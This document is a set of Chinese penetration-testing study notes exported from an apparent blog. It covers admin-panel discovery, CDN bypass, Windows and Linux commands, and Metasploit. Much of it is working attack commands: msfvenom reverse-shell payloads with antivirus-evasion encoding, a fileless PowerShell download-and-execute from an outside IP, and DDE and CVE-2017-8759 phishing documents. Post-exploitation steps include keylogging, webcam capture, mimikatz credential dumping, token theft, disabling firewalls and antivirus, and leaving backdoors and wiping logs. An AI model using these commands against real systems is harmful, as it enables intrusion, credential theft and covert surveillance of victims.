查看5. 借助谷歌语法，像dedecms6. 寻找编辑器后台7. 查找关联性信息，像同一个建站商，注册人或者注册邮箱 寻找网站页脚，通过搜索引擎搜索相同建站商，通过上面的方法再找后台，找到后用相同的后台名称去试要测试的站点。8. 博彩，资金盘的站点 a. 高位端口：xxx.com:8888 b. 子域名：admin.xxx.com c. 可能是完全独立的另一个域名 i. 如果是同一个服务器可以查旁站 ii. 不在同一个服务器就打xss d. 查看css样式，js代码9. 短文件利用： a. 像apache在windows上搭建，如果后台地址是admin_151351834，那么输入admin~1可以自动补全 b. sqlmap --sql-shell load_file(&#x27;d:/wwwroot/index.php&#x27;);查看源代码寻找地址，前提有管理员权限 CDN绕过CDN是内容分发网络，是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。即在不同区域放置缓存服务器以避免一台服务器负荷来达到加速的效果。 判断： 1使用站长工具超级ping，查看各地ping的ip是否一致 寻找真实ip： 1234a. 查看子域名ipb. 敏感文件泄露c. 历史ip判断（ip138）d. 让服务器主动发包（邮件），一般邮件服务器和网站服务器在一个服务器上 绕过cdn访问：修改hosts文件 其他1234567891011121314151617181920212223242526非web服务的网络服务攻击方式：1. 密码破解（爆破）2. 漏洞利用（像溢出漏洞，用已经有的exp秒）3. ddos攻击，使服务器瘫痪4. 欺骗5. 钓鱼（配合社工）拿到一台内网服务器作为跳板机：1. web提权2. 邮件钓鱼3. 社工4. 木马（植入客服）目标对象分析：1. 单个目标服务器（非web）2. web服务器3. 整个网络拓扑：a. 内网b. 外网一般流程：1. 收集目标信息2. 对目标进行分析3. 通过各种漏洞实施攻击，进行入侵4. 留后门，方便下次进入5. 抹去痕迹，清理入侵记录","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"渗透测试学习基础","slug":"渗透测试学习笔记（基础篇）","date":"2024-02-26T02:25:19.097Z","updated":"2022-04-08T17:06:05.750Z","comments":true,"path":"2024/02/26/渗透测试学习笔记（基础篇）/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/","excerpt":"","text":"渗透测试学习笔记（基础篇）一.系统目录、服务、端口、注册表 系统目录 windows 12345系统安装目录，存放系统文件资料Windows/system32：系统配置文件，命令，粘滞键（sethc.exe）Windows/system32/config/SAM：记录用户密码信息的文件 用pe清空密码，或者pe复制密码，搞完再把密码换回去Windows/system32/drivers/etc/hosts：优先域名解析，破解，翻墙 program files 12Program files：程序默认安装文件夹（提权需要知道位数）Program files（x86）：代表32位应用程序 用户 12用户目录，登陆过会有记录，尽量不要创建账号，会被溯源登录管理员账号访问桌面，比在文件夹看到的多 perflogs (存放日志记录（但不是系统日志，系统日志在windows里面）) Program Data：系统临时生成的文件数据，病毒喜欢的文件夹（默认是隐藏的） 服务（services.msc） 服务是一种应用程序类型，它在后台运行。 服务应用程序通常可以在本地和通过网络为用户提供一些功能，例如客户端&#x2F;服务器应用程序、Web服务器、数据库服务器以及其他基于服务器的应用程序。 查看计算机本地服务 常见的服务 12web，dns（域名解析），dhcp（分发ip），ftp（上传下载），smb（文件共享），telnet（远程登录），rdp（远程桌面——3389 操作服务的命令： net start&#x2F;stop + 服务 关掉安全狗：sc config “safedog” start&#x3D;disable（开机服务禁用），然后重启 端口(区分服务) 端口的作用是用来区分服务 端口不可以重复使用 端口范围是从1-65535（1-1024分给了系统自带的一些服务，木马病毒一般使用高位端口。） ![image-20220212164602289](C:\\Users\\86157\\Documents\\Tencent Files\\16778738\\FileRecv\\安全笔记\\image-20220212164602289.png) 常见段口 1234567891011121.HTTP协议代理服务器常用端口号：80/8080/3128/8081/90802.FTP（文件传输）协议代理服务器常用端口号：213.Telnet（远程登录）协议代理服务器常用端口：234.TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；5.SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；6.SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；7.POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；8.TOMCAT，默认的端口号为8080；9.WIN2003远程登陆，默认的端口号为3389；10.Oracle 数据库，默认的端口号为1521；11.MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp；12.QQ，默认的端口号为1080/udp 注册表（regedit） 设置开机启动项 克隆账号密码权限 读取服务密码 隐藏后门 权限维持 注册表结构 12345678910111.HKEY_CLASSES_ROOT 管理文件系统。根据在Windows 中安装的应用程序的扩展名,该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。2.HKEY_CURRENT_USER 管理系统当前的用户信息。在这个根键中保存了本地计算机中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码。在用 户登录Windows 98时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。3.HKEY_LOCAL_MACHINE 管理当前系统硬件配置。在根键这个中保存了本地计算机硬件配置数据,此根键下的子关键字包括在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中。这个根键里面的许多子键与System.ini文件中设置项类似。4.HKEY_USERS 管理系统的用户信息。在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。5.HKEY_CURRENT_CONFIG 管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据,该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的Windows 98中文版的安装的信息。 二.常见Dos命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152531. ping：测试网络连接（TTL值一般是128或64，然后每经过一个路由器-1，一般最多经过32跳）2. tracert：查看经过的路由器（搞c段，判断是不是在一个机房）3. ipconfig：查看网卡信息 a. ipconfig /release：释放ip b. ipconfig /renew：重新获取 c. ipconfig /all：查看详细信息4. systeminfo：查看补丁信息（提权必备）5. arp -a：查看arp缓存表，查看其他主机mac地址6. shutdown -s：关机 a. -t：设置时间，单位为s b. -c：弹框，在“”中输入要写的东西 c. -a：取消 d. -r：重启7. dir：查看当前目录（.是隐藏目录）8. cd：目录移动 a. cd 文件名：移动到所写文件名 b. cd.. ：移动到上一级目录 c. cd c: cd d: ：移动到c/d盘9. md：创建目录，后面跟文件名10. rd：删除目录，后面跟文件名11. copy con xxx.txt：创建文件，后跟路径，默认当前路径，可以改后缀，然后写内容，ctrl+z，回车，创建。12. start：启动文件，后跟文件名，也可以跟url13. type xxx.txt：命令行查看内容14. del xxx.txt：删除文件15. rm /S：递归删除文件夹16. copy：复制文件，后跟原文件路径及目标路径17. move：移动，同上（同级目录移动等于改名）18. cls：清屏19. net start：查看服务20. net stop：关闭服务（有空格的服务用双引号引起来）21. netstat -tanlp：查看端口信息22. net user：查看用户 a. net user 1 1 /add：创建用户 b. net user 1$ 1 /add：创建用户 c. net user 1 1 /del：删除用户 d. net user 用户：查看详细信息23. net localgroup administrator：查看管理员组24. net localgroup administrators 1 /add：添加管理员25. tasklist：查看进程26. taskkill /im xxx.exe /f：结束进程27. echo &quot;123&quot; &gt; 123.txt：写入文件28. query user：查看管理员在不在，登录信息29. msg admin &quot;hello&quot;：弹框，聊天30. net use k: \\\\ 192.168.1.11\\c$ （磁盘映射，走smb协议，win10默认关闭）31. net use k: \\del 断开32. net share c$ /del：删除c盘共享 net share 查看本地开启的共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 33. whoami：查看身份34. hostname：计算机名称35. wmic product get name,version：查看当前安装程序36. 批处理（.bat）：dos命令组合文件，写在里面的命令会被逐一执行 12345678910111213net config workstation 查看当前登录域cmdkey /l 查看远程连接历史记录net user /domain 查看域内用户信息net user xx /domain 查看xx域用户详细信息net user /domain xx 123123 修改域用户密码net group &quot;domain admins&quot; /domain 获取域管理列表net group &quot;domain controllers&quot; /domain 获取域控net localgroup administrators cracer\\cc /add 将域用户cc添加到本地管理员组net view /domain 查看内网多少个域net view /domain:cracer 查看cracer域中的机器列表","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"Windows","slug":"渗透测试/后渗透/Windows","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/"},{"name":"Linux","slug":"渗透测试/后渗透/Windows/Linux","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"metasploit学习笔记","slug":"渗透测试学习笔记（metasploit）","date":"2024-02-26T02:25:19.095Z","updated":"2022-04-08T17:05:10.509Z","comments":true,"path":"2024/02/26/渗透测试学习笔记（metasploit）/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88metasploit%EF%BC%89/","excerpt":"","text":"METASPLOITexploit-db •Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。 12345678910渗透攻击（exploit）测试者利用系统，程序，或服务的漏洞进行攻击的一个过程。攻击载荷（payload）攻击者在目标系统上执行的一段攻击代码，该代码具有返弹连接，创建用户，执行其他系统命令的功能shellcode在目标机器上运行的一段机器指令，成功执行后会返回一个shell模块（module）是指Metasploit框架中所使用的一段软件代码组件。监听器（listener）监听器是metasploit中用来等待介入网络连接的组件。 启动设置 12345678910111213service postgresql startservice metasploit startmsfconsole进入后输入db_status 查看数据库连接状态workspace -a test 创一个工作台删除 -d 选项 进入test工作台Wordspace test使用nmapdb_nmap -sS 192.168.80.1 扫描主机db_export 1.xml 导出扫描结果db_import 1.xml 导入扫描结果hosts 查看扫描结果 信息收集12345678910111213141516171819202122232425262728293031①whois查询：msf &gt; whois example.com②http://searchdns.netcraft.com/在线收集服务器 IP信息工具③nslookupmsf&gt; db_nmap –sS –A192.168.1.111msf&gt; db_services #查看扫描结果msf&gt; search portscanmsf&gt; use auxiliary/scanner/postscan/synsmb_version 模块：msf&gt; use auxiliary/scanner/smb/smb_version找 mssql 主机：msf&gt; use auxiliary/scanner/mssql/mssql_pingSSH 服务器扫描：msf&gt; use auxiliary/scanner/ssh/ssh_versionTelnet服务器扫描msf&gt; use auxiliary/scanner/telnet/telnet_versionFTP 主机扫描：msf&gt; use auxiliary/scanner/ftp/ftp_versionFTP 匿名登录：useauxiliary/scanner/ftp/anonymos扫描局域网内有哪些主机存活useauxiliary/scanner/discovery/arp_sweep扫描网站目录auxiliary/scanner/http/dir_scanner搜索网站中的E-mail地址search_email_collectoruse auxiliary/gather/search_email_collector嗅探抓包msf&gt; use auxiliary/sniffer/psnuffle msf密码破解模块123456789101112131415ssh服务口令猜测use auxiliary/scanner/ssh/ssh_loginmysql口令攻击search mysqluse auxiliary/scanner/mysql/mysql_loginpostgresql攻击search postgresqluse auxiliary/scanner/postgres/postgres_logintomcat 攻击search tomcatuse auxiliary/scanner/http/tomcat_mgr_logintelnet 攻击use auxiliary/scanner/telnet/telnet_loginsamba攻击use auxiliary/scanner/smb/smb_login msf漏洞利用模块12345678910111213141516171819202122常用漏洞利用命令search &lt;name&gt; 用指定关键字搜索可利用漏洞use &lt;exploit name&gt; 使用漏洞show options 显示选项set &lt;OPTION NAME&gt; &lt;option&gt; 设置选项show payloads 显示装置show targets 显示目标(os版本)set TARGET &lt;target number&gt; 设置目标版本exploit 开始漏洞攻击sessions -l 列出会话sessions -i &lt;ID&gt; 选择会话sessions -k &lt;ID&gt; 结束会话&lt;ctrl&gt; z 把会话放到后台&lt;ctrl&gt; c 结束会话show auxiliary 显示辅助模块use &lt;auxiliary name&gt; 使用辅助模块set &lt;OPTION NAME&gt; &lt;option&gt; 设置选项run 运行模块 word钓鱼 web_delivery MSF PAYLOAD模块•msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。 payload参数： 12345678910111213a. -p：指定payload，一般用 windows/meterpreter/reverse_tcp 比较多b. -e：指定要用的编码器，一般用 shikata_ga_nai ，其他的都不太好用c. -i：指定编码次数，后面跟数字，如：-i 8d. -b：设定规避字符集，指定需要过滤的坏字符，如：&#x27;\\x0f&#x27;、&#x27;\\x00&#x27;e. -f：指定输出格式，如：-f exef. -o：指定生成文件存放位置，也可用&gt;代替g. -l：列出指定模块的所有可用资源h. -a：指定payload的目标架构，如x86，x64，x86_64，默认为32位程序i. -s：设定payload的最大长度，即文件大小j. --platform：指定payload的目标平台，如windows，linuxk. 其余参数可用 -h 查看例子：msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;IP&gt;lport=&lt;port&gt; -f exe -o payload.exe 建立监听123456789101112131415161. 常规监听 msfconsole：进入msf控制台 use exploit/multi/handler：使用模块 set payload windows/meterpreter/reverse_tcp：设置payload set lhost &lt;ip&gt;：设置要侦听的ip set lport &lt;port&gt;：设置要侦听的端口 options：查看设置详情） run或exploit2. 快速监听：默认持续侦听 msfconsole：进入msf控制台 handler -H &lt;ip&gt; -P &lt;port&gt; -p &lt;payload&gt;3. 其他 exploit -j -z：后台持续监听，-j是后台任务，-z是持续监听，使用jobs查看和管理 jobs -K可结束所有任务。 sessions -l：查看我的会话 sessions -i 1：调用我的1号会话 123456789payload可持续化： 因为生成木马反弹payload后容易被杀死，而手动迁移进程的migrate有一个操作间隔，所以可以在生成payload时就加上进程迁移，即生成木马时加上：PrependMigrate=true PrependMigrateProc=svchost.exemsfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1122 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe 各种平台payload生成12345678910111213Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT=1122 -a x86 --platform Linux -f elf &gt; shell.elfWindows msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=1122 -f exe &gt; shell.exeMac msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoAndroid msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST= LPORT=1122 -f raw &gt; shell.apk msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=1122 R &gt; test.apk安卓免杀 rat yutube 12345678查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用msfvenom -p windows/meterpreter/reverse_tcp --list-optionsmsfvenom --list payloads可查看所有payloadsmsfvenom --list encoders可查看所有编码器评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器类似可用msfvenom --list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats 生成payload123456789101112131415161718Powershell msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST= LPORT=1122 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1Netcatnc正向连接 msfvenom -p windows/shell_hidden_bind_tcp LHOST= LPORT=1122 -f exe&gt; 1.exenc反向连接，监听 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=1122 -f exe&gt; 1.exePHPmsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASPmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWARmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war powershell msf无文件攻击powershell 必须加&#x2F;x64&#x2F; 1234567891011121314151617上面生成的木马都是要发送到服务器运行才行，有落地文件，会有痕迹，如果想建立会话的同时不想在服务器留文件，可以用无文件攻击，通过命令远程加载代码到内存运行，一旦重启无法溯源。具体操作：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=148.28.27.106 lhost=1234 -f psh-reflection &gt; x.ps1（这一步生成ps脚本文件）启用vps，搭建网站，把文件放在网站目录里，通过对外部文件的访问来http://149.28.27.106/x.ps1进行调用，如vps的ip为192.168.8.1建立侦听在目标机的命令行输入：powershell IEX (New-Object Net.Webclient).DownloadString(&#x27;http://149.28.27.106/x.ps1&#x27;)，运行进行调用，如vps的ip为192.168.8.1建立侦听在目标机的命令行输入：powershell IEX (New-Object Net.Webclient).DownloadString(&#x27;http://149.28.27.106/x.ps1&#x27;)，运行建立连接 WORD钓鱼12新建word设置域，DDEAUTO C:\\\\windows\\\\system32\\\\cmd.exe &quot;/k powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.8.1/x.ps1&#x27;) msf使用宏钓鱼12345678910git clone https://github.com/bhdresh/CVE-2017-8759.gitpython cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.80.132/logo.txtmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.132 LPORT=1133 -f exe &gt; /root/shell.exe捆绑后开80端口 netstat -tnlppython cve-2017-8759_toolkit.py -M exp -e http://192.168.80.132/shell.exe -l /root/shell.exe开启监听模块，发送给目标运行钓鱼文件，等代上线 msf制作excle钓鱼web_delivery 1234567use exploit/multi/script/web_deliveryset target 2 target regsvr32 windows/64/meterpreter/reverse_tcpset payload windows/meterpreter/reverse_tcpset LHOST 192.168.3.143set URIPATH /exploit powershell -w hidden -nop IEX (New-ObjectNet.Webclient).DownloadString(‘http://192.168.8.1/x.ps1‘) ngrok转发•本机安装客户端 •.&#x2F;sunny clientid id号 Msf5-Evasion模块免杀123show evasionhttp://virustotal.com/ 验证静态免杀 bypass shellter免杀•shellcode代码注入工具 •https://www.shellterproject.com/download/ py免杀123456789生产py文件的payloadmsfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.8.124 -i 11 -f py -o msf.py 建立侦听将生成的py文件修改处理下载pyinstall：https://nchc.dl.sourceforge.net/project/pyinstaller/2.0/pyinstaller-2.0.zip解压安装安装pywin32pip.exe install pywin32python.exe pyinstaller-2.0\\pyinstaller.py --console --onefile pyinstaller-2.0\\11.py venom免杀paylaod123456下载地址：https://github.com/r00t-3xp10it/venomsudo ./setup.sh运行sudo ./venom.sh Meterpreter后渗透模块1Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 权限，使用平台，环境 基础命令12345678910111213141516171819202122232425262728293031323334353637383940进程迁移migrate关闭杀软 ——失效—— run killav 通过服务关闭通过其 shell 来关闭防火墙netsh adcfirewall set allprofiles state off查看目标机所有流量run packetrecorder -i 1提取系统信息run scraperps 查看进程migrate 1774 切换进程截屏 screenshot获取系统运行的平台 sysinfocat c:\\boot.ini#查看文件内容,文件必须存在del c:\\boot.ini #删除指定的文件upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机主上，如upload setup.exe C:\\\\windows\\\\system32\\download nimeia.txt /root/Desktop/ # 下载文件到本机上如：download C:\\\\boot.ini /root/edit c:\\boot.ini # 编辑文件getwd#打印工作目录cd#更改本地目录ls#列出在当前目录中的文件列表pwd#输出工作目录cd c:\\\\ #进入目录文件下rm file #删除文件mkdir dier #在受害者系统上的创建目录rmdir#受害者系统上删除目录dir#列出目标主机的文件和文件夹信息mv#修改目标主机上的文件名search -d d:\\\\www -f web.config #search 文件，如search -d c:\\\\ -f *.docrun vnc 查看桌面 修改vnc配置run getgui -e 开启目标主机远程桌面sysinfo 命令为显示远程主机的系统信息execute -f notepad.exeexecute -h 显示帮助信息。-f为执行要运行的命令如果希望隐藏后台执行，加参数-Hexecute -H -f notepad.exe 摄像头命令1234567record_mic #音频录制webcam_chat #查看摄像头接口webcam_list #查看摄像头列表webcam_stream #摄像头视频获取 端口转发（不需要高权限，正常会话权限）12345678910111213portfwd -h用法：portfwd [-h] [add | delete | list | flush] [args]选项： -L &lt;opt&gt;要监听的本地主机（可选） -h帮助横幅 -l &lt;opt&gt;要监听的本地端口 -p &lt;opt&gt;连接到的远程端口 -r &lt;opt&gt;要连接到的远程主机portfwd add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接 键盘记录1234keyscan_start：开启键盘记录功能keyscan_dump：显示捕捉到的键盘记录信息keyscan_stop：停止键盘记录 HASH获取12345678910111213meterpreter &gt; load mimikatz #加载mimikatz --kiwi--meterpreter &gt; msv #获取hash值meterpreter &gt; kerberos #获取明文（system权限）meterpreter &gt;ssp #获取明文信息meterpreter &gt; wdigest #获取系统账户信meterpreter &gt;mimikatz_command -f a:: #必须要以错误的模块来让正确的模块显示meterpreter &gt;mimikatz_command -f hash:: #获取目标 hashmeterpreter &gt; mimikatz_command -f samdump::hashesmeterpreter &gt; mimikatz_command -f sekurlsa::searchParun post/windows/gather/smart_hashdumpwin7 有uac控制 嗅探123456789101112use sniffer # 加载嗅探模块sniffer_interfaces #列出目标主机所有开放的网络接口sniffer_start 2 #获取正在实施嗅探网络接口的统计数据sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探sniffer_stop 2 #停止嗅探对抓取的包进行解包：use auxiliary/sniffer/psnuffleset pcapfile 1.caprunwireshark，加载这个/tmp/xpsp1.cap 也可 盗取令牌1234meterpreter &gt;use incognito 加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)meterpreter &gt;list_tokens -u 列出目标主机用户的可用令牌meterpreter &gt;list_tokens -g 列出目标主机用户组的可用令牌meterpreter &gt;impersonate_token DOMAIN_NAME\\\\USERNAME 假冒目标主机上的可用令牌,如meterpreter &gt; impersonate_token QLWEB\\\\Administrato 持久控制服务器123456789101112注册表，服务后门，计划任务，​ 360，火绒绕过​ cs 调用powershell 无文件攻击 web_deliveryrookit（linux）","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"},{"name":"免杀","slug":"渗透测试/后渗透/msf/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E5%85%8D%E6%9D%80/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"Linux操作学习","slug":"渗透测试学习笔记(Linux基础篇)","date":"2024-02-26T02:25:19.094Z","updated":"2022-04-08T17:03:18.176Z","comments":true,"path":"2024/02/26/渗透测试学习笔记(Linux基础篇)/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(Linux%E5%9F%BA%E7%A1%80%E7%AF%87)/","excerpt":"","text":"Linux基础操作学习exploit-db.com：内核漏洞发布网站 内核版本：XX.YY.ZZ（XX代表主版本号，YY代表次版本号，ZZ代表补丁次数） 次版本号奇数代表开发版，偶数代表稳定版 Linux系统目录结构： root：管理员家目录 bin：存放二进制可执行文件（ls，cat等），即存放普通命令 sbin：存放管理员执行的系统命令 boot：存放用于系统引导时的各种文件 dev：存放设备文件，磁盘硬盘等 etc：存放系统管理和配置文件 home：用户家目录，相当于windows用户目录、 var：放日志文件，网站根目录 lib：存放库文件 用于存放系统应用程序，最庞大的目录，要用到的应用程序和文件几乎都在这里 media，mnt：挂载光驱、光盘目录 lost+found：平常是空的，系统非正常关机而无家可归的文件在这里 proc：系统开机后临时生成的文件 srv：存放一些服务 tmp：用于存放各种临时文件，是公用的临时文件存储点，有源代码编译权限 opt：存放外部程序 selinux：服务防火墙 sys：存放系统文件 二、Linux常用命令1.文件操作类 1234567891011121314151617181920212223242526272829303132333435363738394041a. pwd：查看当前路径b. cd 目录：转到目录 cd .. ：返回上一级目录 cd - ：后退c. du -sh：统计文件大小d. ls：查看文件，文件夹 -l：长格式显示详细信息 -a：显示所有子目录和文件信息，包括隐藏文件 -d：显示目录本身属性 -R：递归显示内容 -h：以更易读的方式（K,M等）显示大小e. chomd （39:50）这里看视频更方便一些 权限：r读（4），w写（2），x执行（1），d表示为文件夹 用户：u所有者，g用户分组，o其他人，a所有人 chomd g+x 1.txt：对1.txt的用户组添加可执行权限（g-x即为去除权限） chomd 777 a.txt：所有权限设置为可读可写可执行 chown test:test a.jpg：改变所有者和用户组 搭建网站时：chown -R apache:apache /var/www/html 递归缩小权限f. touch：创建文件或更新文件时间标记g. mkdir：创建目录 -p创建递归目录h. cp：复制文件或目录 -r递归复制 -f强制覆盖 -p保持源文件属性不变i. rm：删除文件或目录 -r递归 -f强制j. mv：移动文件或目录k. wc：统计文件中出现的单词数量，字节数量和行数l. cat：查看文件内容find：查找文件或目录 格式：find [查找范围] [查找条件] -name：按文件名查找 -size：按文件大小查找 -user：按文件属性查找 -type：按文件类型查找m.压缩命令gzip：gzip [文件] [压缩文件名].gz gzip -d xxx.gz 解压缩 bzip2：bizp2 [文件] [压缩文件名].bz2 解压缩同上n.打包命令tar tar -cvf x.tar 1 2 3 把1,2,3文件打包为x.tar，可以再配合压缩 tar -xvf x.tar 解包 tar -tvf x.tar 查看包里文件 tar -rvf x.tar 4 把4追加到x.tar中 tar -jxvf x.tar.bz2 bz2下一步解压所有文件 tar -zxvf x.tar.bz2 gzip下一步解压所有文件 2.系统操作命令 1234567891011121314151617a. uname -r：查看系统内核版本，-a查看完整信息b. hostname：查看主机名（后加名称可更改）c. ifconfig：查看网卡ip信息（dhclient eth0：获取网卡ip）d. cat /proc/cupinfo：查看系统cpu信息cat /proc/meminfo：查看系统内存信息e. reboot：重启f. Halt：关机 用户账户命令（1:10:30） 创建用户：useradd [用户] 删除用户：userdel -r 